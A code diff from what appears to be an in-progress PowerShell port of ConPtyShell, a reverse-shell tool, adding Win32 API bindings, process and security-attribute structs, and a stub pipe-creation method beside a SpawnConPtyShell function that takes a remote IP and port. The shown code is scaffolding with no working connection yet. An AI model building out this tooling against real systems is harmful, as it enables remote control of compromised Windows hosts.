@@ -776,6 +776,31 @@ New-Struct. :P
 
 # This is the part where we port ConPtyShell to PowerShell
 
+
+$Mod = New-InMemoryModule -ModuleName Win32
+$global:Mod = $Mod
+
+$FunctionDefinitions = @(
+    (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
+    (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError)
+)
+
+$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
+$global:Kernel32 = $Types['kernel32']
+
+$global:ProccessInformation =  struct $Mod PROCESS_INFORMATION @{
+    hProcess =      field 0 IntPtr
+    hTread =        field 1 IntPtr
+    dwProcessId =   field 2 int
+    dwThreadId =    field 3 int
+}
+
+$SECURITY_ATTRIBUTES_TYPE = struct $Mod SECURITY_ATTRIBUTES @{
+    nLength =               field 0 Int
+    lpSecurityDescriptor =  field 1 IntPtr
+    bInheritHandle =        field 2 Int
+}
+
 class ConPtyShellException : System.Exception {
     hidden [string]$error_string = "[-] ConPtyShellException: "
 
@@ -787,7 +812,17 @@ class ConPtyShellException : System.Exception {
 
 class ConPtyShell {
     <# Define the class. Try constructors, properties, or methods. #>
-    
+    $ProccessInformation = $global:ProccessInformation
+
+    hidden static [void] CreatePipes([IntPtr] $InputPipeRead, [IntPtr] $InputPipeWrite, [IntPtr] $OutputPipeRead, [IntPtr] $OutputPipeWrite) {
+
+        $pSec = New-Object -TypeName SECURITY_ATTRIBUTES
+        
+        $pSec.nLength = 1
+
+        Write-Host "psec: " $pSec.nLength
+    }
+
     static [string] SpawnConPtyShell([string] $remoteIp, [uint32] $remotePort, [uint32] $rows, [uint32] $cols, [string] $commandLine, [bool] $upgradeShell) {
 
         [IntPtr] $shellSocket = [IntPtr]::Zero
@@ -810,27 +845,16 @@ class ConPtyShell {
         $grandParentProcess = $null
 
 
-
-
-
-
-        $Mod = New-InMemoryModule -ModuleName Win32
-
-        $FunctionDefinitions = @(
-            (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
-            (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError)
-        )
-
-        $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
-        $Kernel32 = $Types['kernel32']
-
-
+        $Kernel32 = $global:Kernel32
         $kernel32base = $Kernel32::GetModuleHandle('kernel32')
 
         [bool] $conptyCompatible = $false
         if ($Kernel32::GetProcAddress($kernel32base, 'CreatePseudoConsole') -ne [IntPtr]::Zero) {
             $conptyCompatible = $true
         }
+
+
+        [ConPtyShell]::CreatePipes($InputPipeRead, $InputPipeWrite, $OutputPipeRead, $OutputPipeWrite)
 
         # $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
         # Write-Host "[GetProcAddress]: Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
